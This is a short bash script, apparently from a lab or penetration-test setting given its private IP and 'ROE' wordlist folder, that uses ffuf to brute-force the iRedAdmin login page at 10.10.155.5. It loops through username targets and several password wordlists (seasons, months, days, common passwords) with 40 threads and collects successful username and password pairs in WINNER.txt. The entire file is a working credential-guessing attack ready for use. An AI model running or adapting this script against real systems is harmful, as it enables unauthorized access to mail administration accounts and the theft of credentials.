#!/bin/bash

TARGETS="overnight_targets.txt"
URL="https://10.10.155.5/iredadmin/login"
WORDLISTS=("seasons.txt" "10k-most-common.txt" "common-passwords.txt" "months.txt" "days.txt")

echo "[+] Starting Overnight Pasta-pocalypse..."
echo "----------------------------------------"

for list in "${WORDLISTS[@]}"; do
    echo "[!] Testing Wordlist: $list"
    # Run ffuf and append any non-zero results to winner.txt
    ffuf -w $TARGETS:W1 -w ROE-wordlists/$list:W2 -X POST -d "username=W1&password=W2" -u $URL -fs 0 -t 40 -o temp_results.json
    
    # Check if we got a hit (using grep to see if the JSON contains a result)
    if grep -q "url" temp_results.json; then
        echo "[***] HIT FOUND IN $list! Check WINNER.txt [***]"
        cat temp_results.json >> WINNER.txt
    fi
done

echo "----------------------------------------"
echo "[+] All lists exhausted. Check WINNER.txt for the prize."
